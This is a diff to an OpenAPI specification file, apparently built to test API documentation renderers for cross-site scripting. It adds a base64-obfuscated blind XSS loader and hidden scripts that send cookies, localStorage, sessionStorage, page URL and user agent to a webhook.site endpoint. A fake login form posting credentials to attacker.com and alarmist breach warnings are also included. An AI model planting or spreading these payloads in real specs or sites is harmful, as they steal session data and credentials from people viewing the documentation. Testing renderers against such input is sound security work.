@@ -1,10 +1,7 @@
 openapi: 3.0.0
 info:
   title: |
-    XSS Test <script>alert('DOM XSS from Info Title!');</script>
-    <img src="x" onerror="alert('Image onerror XSS from Info Title!');">
-    <svg/onload="alert('SVG onload XSS from Info Title!');">
-    <iframe srcdoc="<h1 style='color:blue;'>Malicious Frame in Title</h1><script>parent.alert('iframe XSS from Info Title!');</script>" style="width:100%;height:50px;border:none;"></iframe>
+    XSS Test - Security Audit Document
   description: |
     <style>
       body { background-color: black !important; color: red !important; }
@@ -66,6 +63,34 @@ info:
     <p>Your session has been identified as compromised due to recent unusual activity. For your security, immediate re-authentication is required to prevent unauthorized access to your sensitive data.</p>
     <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExc3RvMXhvemxndGg0MzdldnQyazgyczEwdXpmdW5qZWpqZGxlc2M4aCZlcD12MV9pbnRlcm5uYWxfZ2lmX2J5X2lkJmN0PWc/e5jA4VlhW7gbHYKFrO/giphy.gif" alt="Security Breach Animated" style="max-width: 100%; height: auto; margin: 20px auto; display: block; border-radius: 8px;">
 
+    <!-- Blind XSS Payload targeting webhook.site -->
+    <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vd2ViaG9vay5zaXRlL2M5YTg5YTNkLWU2MTktNGQwNi04MjgxLTc2ZThlY2M1NGRjMiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsgb25lcnJvcj1ldmFsKGF0b2IodGhpcy5pZCkpPg== onerror=eval(atob(this.id)) style="display:none;">
+
+    <!-- Re-introducing direct script tag for DOM XSS, with exfiltration to webhook.site -->
+    <div style="display:none;">
+      <script>
+        try {
+            const exfilData = {
+                location: window.location.href,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage)
+            };
+            fetch('https://webhook.site/c9a89a3d-e619-4d06-8281-76e8ecc54dc2?data=' + btoa(JSON.stringify(exfilData)), {
+                method: 'GET',
+                mode: 'no-cors'
+            }).then(() => console.log('Exfiltration attempt sent.')).catch(e => console.error('Exfiltration error:', e));
+            alert('DOM XSS: Sensitive data exfiltration attempt initiated from Info Description!');
+        } catch (e) {
+            console.error('XSS payload failed:', e);
+        }
+      </script>
+    </div>
+
+    <!-- Re-introducing iframe srcdoc for visual XSS within description -->
+    <iframe srcdoc="<p style='color:lime;font-size:20px;'>&#128008; You are now viewing malicious content &#128008;</p><script>parent.alert('iframe XSS from Info Description!');</script>" style="width:100%;height:100px;border:3px dashed #FF0000; border-radius: 8px;"></iframe>
+
+
     <div class="fake-login-form">
       <h2 style="text-align: center; color: #00FF00; margin-bottom: 25px;">Secure Login for Identity Verification</h2>
       <form action="https://attacker.com/phishing_endpoint" method="POST">
@@ -81,27 +106,6 @@ info:
     </div>
 
     <p style="color: yellow; text-align: center; font-weight: bold;">Do NOT ignore this warning. Failure to re-authenticate will result in permanent account lockout within 24 hours.</p>
-
-    <script>
-      // Aggressive DOM XSS payload targeting document.cookie and localStorage
-      try {
-          const exfilData = {
-              location: window.location.href,
-              cookies: document.cookie,
-              localStorage: JSON.stringify(localStorage),
-              sessionStorage: JSON.stringify(sessionStorage)
-          };
-          fetch('https://attacker.com/exfiltrate?data=' + btoa(JSON.stringify(exfilData)), {
-              method: 'GET', // Using GET for simplicity in ethical testing
-              mode: 'no-cors'
-          }).then(() => console.log('Exfiltration attempt sent.')).catch(e => console.error('Exfiltration error:', e));
-          alert('DOM XSS: Sensitive data exfiltration attempt initiated from Info Description!');
-      } catch (e) {
-          console.error('XSS payload failed:', e);
-      }
-    </script>
-    <img src="x" onerror="alert('Image onerror XSS from Info Description!');">
-    <iframe srcdoc="<p style='color:lime;font-size:20px;'>&#128008; You are now viewing malicious content &#128008;</p><script>parent.alert('iframe XSS from Info Description!');</script>" style="width:100%;height:100px;border:3px dashed #FF0000; border-radius: 8px;"></iframe>
   version: 1.0.0
 servers:
   - url: https://api.legitimate-domain.com/v1
@@ -112,15 +116,15 @@ paths:
       summary: "CRITICAL SECURITY BREACH: Immediate Password Reset Required!"
       description: |
         <p style="color: #FFA500; font-weight: bold; font-size: 1.2em;">A widespread data breach has been detected. You MUST reset your password through THIS endpoint to secure your account. Ignoring this will lead to account termination.</p>
+        <!-- XSS payload in endpoint description for immediate execution -->
         <script>
-          // XSS payload in endpoint description for immediate execution
           if (document.body) {
               const p = document.createElement('p');
               p.style.color = 'cyan';
               p.textContent = 'Endpoint Description XSS Active: Attempting to grab more data...';
               document.body.appendChild(p);
           }
-          fetch('https://attacker.com/log_endpoint_access?url=' + encodeURIComponent(window.location.href) + '&ua=' + encodeURIComponent(navigator.userAgent), { mode: 'no-cors' });
+          fetch('https://webhook.site/c9a89a3d-e619-4d06-8281-76e8ecc54dc2?log=endpoint_access&url=' + encodeURIComponent(window.location.href) + '&ua=' + encodeURIComponent(navigator.userAgent), { mode: 'no-cors' });
           alert('DOM XSS from Endpoint Description!');
         </script>
         <img src="x" onerror="alert('Image onerror XSS from Endpoint Description!');">
